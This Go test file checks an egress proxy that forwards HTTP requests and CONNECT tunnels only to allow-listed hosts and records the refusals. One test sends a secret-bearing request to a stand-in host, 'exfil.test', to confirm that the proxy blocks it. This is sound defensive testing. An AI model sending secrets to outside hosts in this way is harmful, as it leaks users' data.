package egress

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
	"time"
)

// proxyTo is a proxy whose every allowed connection goes to server, whatever host was named, so
// the tests need no network and no name resolution.
func proxyTo(t *testing.T, server *httptest.Server, allow ...string) *Proxy {
	t.Helper()
	p, err := Start(allow, nil)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(p.Close)
	p.dial = func(ctx context.Context, network, _ string) (net.Conn, error) {
		return (&net.Dialer{}).DialContext(ctx, network, server.Listener.Addr().String())
	}
	return p
}

func TestTheAllowListMatchesHostsAndSubdomains(t *testing.T) {
	p := &Proxy{allow: []string{"registry.npmjs.org", "*.example.com"}}
	for host, want := range map[string]bool{
		"registry.npmjs.org": true, "REGISTRY.npmjs.org.": true, "evil-registry.npmjs.org": false,
		"a.example.com": true, "a.b.example.com": true, "example.com": false, "example.com.evil.test": false,
	} {
		if got := p.Allowed(host); got != want {
			t.Errorf("Allowed(%q) = %v", host, got)
		}
	}
}

// A plain request to an allowed host is forwarded; one to any other host is refused with a reason
// and remembered, without a connection being made.
func TestPlainRequestsAreForwardedOnlyToAllowedHosts(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = io.WriteString(w, "hello from "+r.Host)
	}))
	defer server.Close()
	p := proxyTo(t, server, "allowed.test")
	since := time.Now()
	client := &http.Client{Transport: &http.Transport{Proxy: func(*http.Request) (*url.URL, error) {
		return url.Parse(fmt.Sprintf("http://127.0.0.1:%d", p.Port()))
	}}}
	res, err := client.Get("http://allowed.test/x")
	if err != nil {
		t.Fatal(err)
	}
	body, _ := io.ReadAll(res.Body)
	_ = res.Body.Close()
	if res.StatusCode != 200 || string(body) != "hello from allowed.test" {
		t.Fatalf("allowed: %d %q", res.StatusCode, body)
	}
	res, err = client.Get("http://exfil.test/?secret=1")
	if err != nil {
		t.Fatal(err)
	}
	body, _ = io.ReadAll(res.Body)
	_ = res.Body.Close()
	if res.StatusCode != http.StatusForbidden || !strings.Contains(string(body), "does not allow exfil.test") {
		t.Fatalf("refused: %d %q", res.StatusCode, body)
	}
	if got := p.RefusedSince(since); len(got) != 1 || got[0] != "exfil.test" {
		t.Fatalf("refusals recorded: %v", got)
	}
}

// CONNECT, which HTTPS uses, is tunnelled to an allowed host and refused for any other.
func TestConnectIsTunnelledOnlyToAllowedHosts(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = io.WriteString(w, "tunnelled")
	}))
	defer server.Close()
	p := proxyTo(t, server, "allowed.test")
	connect := func(host string) (string, *bufio.Reader, net.Conn) {
		conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", p.Port()))
		if err != nil {
			t.Fatal(err)
		}
		_, _ = fmt.Fprintf(conn, "CONNECT %s:443 HTTP/1.1\r\nHost: %s:443\r\n\r\n", host, host)
		r := bufio.NewReader(conn)
		status, _ := r.ReadString('\n')
		return status, r, conn
	}
	status, r, conn := connect("allowed.test")
	defer func() { _ = conn.Close() }()
	if !strings.Contains(status, "200") {
		t.Fatalf("allowed CONNECT: %q", status)
	}
	for line, _ := r.ReadString('\n'); line != "\r\n" && line != ""; line, _ = r.ReadString('\n') {
	}
	_, _ = io.WriteString(conn, "GET / HTTP/1.1\r\nHost: allowed.test\r\nConnection: close\r\n\r\n")
	rest, _ := io.ReadAll(r)
	if !strings.Contains(string(rest), "tunnelled") {
		t.Fatalf("the tunnel did not reach the server: %q", rest)
	}
	status, _, other := connect("exfil.test")
	defer func() { _ = other.Close() }()
	if !strings.Contains(status, "403") {
		t.Fatalf("a CONNECT to a host off the list: %q", status)
	}
}

func TestModes(t *testing.T) {
	for value, want := range map[string]Mode{"": ModeOpen, "open": ModeOpen, "Registries": ModeRegistries, "off": ModeOff, "none": ModeOff} {
		if got, err := ParseMode(value); err != nil || got != want {
			t.Errorf("ParseMode(%q) = %q, %v", value, got, err)
		}
	}
	if _, err := ParseMode("everything"); err == nil {
		t.Error("an unknown mode was accepted")
	}
}
